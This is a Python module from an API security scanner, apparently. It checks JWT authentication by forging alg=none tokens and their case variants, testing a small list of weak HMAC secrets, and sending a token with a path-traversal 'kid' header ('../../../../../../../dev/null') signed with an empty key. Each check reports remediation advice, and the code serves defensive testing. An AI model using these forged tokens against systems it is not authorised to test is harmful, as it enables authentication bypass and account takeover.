"""JWT-specific checks: alg=none acceptance and a small common-secret probe.

Requires PyJWT. If a valid sample JWT is supplied in the config
(jwt_sample_token), this module will:
  1. Try to forge a token with alg=none and see if it's accepted.
  2. Try a short list of very common/weak HMAC secrets against the token's
     signature, purely to catch egregiously weak secrets (e.g. "secret").
This is intentionally limited in scope - it is not a full JWT cracker.
"""
import base64
import json
from scanner.models import Endpoint, Finding, Severity

try:
    import jwt as pyjwt
except ImportError:
    pyjwt = None

COMMON_WEAK_SECRETS = ["secret", "changeme", "password", "123456", "jwt_secret", "test"]


def _b64url_decode_segment(seg: str) -> bytes:
    padding = "=" * (-len(seg) % 4)
    return base64.urlsafe_b64decode(seg + padding)


def run(client, endpoints: list[Endpoint], jwt_sample_token: str = None) -> list[Finding]:
    findings = []

    if not jwt_sample_token:
        return findings  # nothing to test

    if pyjwt is None:
        findings.append(Finding(
            check="jwt", severity=Severity.INFO,
            title="PyJWT not installed - skipping JWT checks",
            endpoint="-", detail="Install PyJWT (`pip install pyjwt`) to enable JWT checks."
        ))
        return findings

    parts = jwt_sample_token.split(".")
    if len(parts) != 3:
        findings.append(Finding(
            check="jwt", severity=Severity.INFO,
            title="Provided jwt_sample_token doesn't look like a JWT",
            endpoint="-", detail="Expected a 3-part header.payload.signature token."
        ))
        return findings

    header = json.loads(_b64url_decode_segment(parts[0]))
    payload = json.loads(_b64url_decode_segment(parts[1]))

    # 1. alg=none forgery attempt
    forged_header = dict(header)
    forged_header["alg"] = "none"
    forged_token = (
        base64.urlsafe_b64encode(json.dumps(forged_header).encode()).rstrip(b"=").decode() + "." +
        base64.urlsafe_b64encode(json.dumps(payload).encode()).rstrip(b"=").decode() + "."
    )

    for ep in endpoints:
        if not ep.auth_required:
            continue
        path = ep.resolved_path()
        label = f"{ep.method} {path}"
        try:
            resp = client.request(ep.method, path, headers={"Authorization": f"Bearer {forged_token}"},
                                   params=ep.params if ep.method == "GET" else None,
                                   json_body=ep.body, auth_override="keep")
        except Exception:
            continue

        if resp.status_code < 300:
            findings.append(Finding(
                check="jwt", severity=Severity.CRITICAL,
                title="JWT 'alg=none' forged token accepted",
                endpoint=label,
                detail=("A JWT with its signature stripped and algorithm set to 'none' was "
                        "accepted as valid. The API must reject unsigned/none-alg tokens "
                        "explicitly and enforce an allow-list of accepted algorithms."),
                evidence=f"HTTP {resp.status_code}",
                owasp_ref="API2:2023 Broken Authentication",
                curl_repro=getattr(resp, "curl_repro", ""),
            ))
        break  # one endpoint is enough to prove/disprove this

    # 2. weak secret probe (only meaningful for HS256/HS384/HS512 tokens)
    if header.get("alg", "").upper().startswith("HS"):
        for secret in COMMON_WEAK_SECRETS:
            try:
                pyjwt.decode(jwt_sample_token, secret, algorithms=[header["alg"]])
                findings.append(Finding(
                    check="jwt", severity=Severity.CRITICAL,
                    title="JWT signed with a common weak secret",
                    endpoint="-",
                    detail=(f"The sample JWT's signature validates successfully against a common "
                            f"weak secret ('{secret}'). Rotate to a long, random, unguessable "
                            "secret (32+ bytes) immediately."),
                    owasp_ref="API2:2023 Broken Authentication",
                ))
                break
            except Exception:
                continue

    # 3. alg=none case variations (some libraries only blocklist the exact
    # lowercase string "none")
    for alg_variant in ("None", "NONE", "nOnE"):
        variant_header = dict(header)
        variant_header["alg"] = alg_variant
        variant_token = (
            base64.urlsafe_b64encode(json.dumps(variant_header).encode()).rstrip(b"=").decode() + "." +
            base64.urlsafe_b64encode(json.dumps(payload).encode()).rstrip(b"=").decode() + "."
        )
        for ep in endpoints:
            if not ep.auth_required:
                continue
            path = ep.resolved_path()
            label = f"{ep.method} {path}"
            try:
                resp = client.request(ep.method, path, headers={"Authorization": f"Bearer {variant_token}"},
                                       params=ep.params if ep.method == "GET" else None,
                                       json_body=ep.body, auth_override="keep")
            except Exception:
                continue
            if resp.status_code < 300:
                findings.append(Finding(
                    check="jwt", severity=Severity.CRITICAL,
                    title=f"JWT alg='{alg_variant}' case-variant accepted",
                    endpoint=label,
                    detail=(f"A forged token using alg='{alg_variant}' (a case-variation of "
                            "'none') was accepted. Signature verification must reject any "
                            "case-insensitive match to 'none', not just the exact lowercase "
                            "string."),
                    evidence=f"HTTP {resp.status_code}",
                    owasp_ref="API2:2023 Broken Authentication",
                    curl_repro=getattr(resp, "curl_repro", ""),
                ))
            break  # one endpoint is enough to prove/disprove this

    # 4. 'kid' header path-traversal probe (key-confusion attack): if the
    # server resolves a signing key from disk using the unsanitized 'kid'
    # claim, pointing it at a known-empty file (e.g. /dev/null) and signing
    # with an empty secret can forge a valid token.
    if header.get("alg", "").upper().startswith("HS"):
        kid_header = dict(header)
        kid_header["kid"] = "../../../../../../../dev/null"
        try:
            kid_token = pyjwt.encode(payload, key="", algorithm=header["alg"], headers=kid_header)
            if isinstance(kid_token, bytes):
                kid_token = kid_token.decode()
        except Exception:
            kid_token = None

        if kid_token:
            for ep in endpoints:
                if not ep.auth_required:
                    continue
                path = ep.resolved_path()
                label = f"{ep.method} {path}"
                try:
                    resp = client.request(ep.method, path, headers={"Authorization": f"Bearer {kid_token}"},
                                           params=ep.params if ep.method == "GET" else None,
                                           json_body=ep.body, auth_override="keep")
                except Exception:
                    continue
                if resp.status_code < 300:
                    findings.append(Finding(
                        check="jwt", severity=Severity.CRITICAL,
                        title="JWT 'kid' header path traversal accepted (key confusion)",
                        endpoint=label,
                        detail=("A forged token with a 'kid' header pointing at a local file "
                                "(/dev/null, which is empty) was signed with an empty secret and "
                                "accepted. This suggests the 'kid' claim is used unsanitized to "
                                "locate a signing key on disk - an attacker who can predict a "
                                "zero/known-content file can forge valid tokens."),
                        evidence=f"HTTP {resp.status_code}",
                        owasp_ref="API2:2023 Broken Authentication",
                        curl_repro=getattr(resp, "curl_repro", ""),
                    ))
                break  # one endpoint is enough to prove/disprove this

    return findings
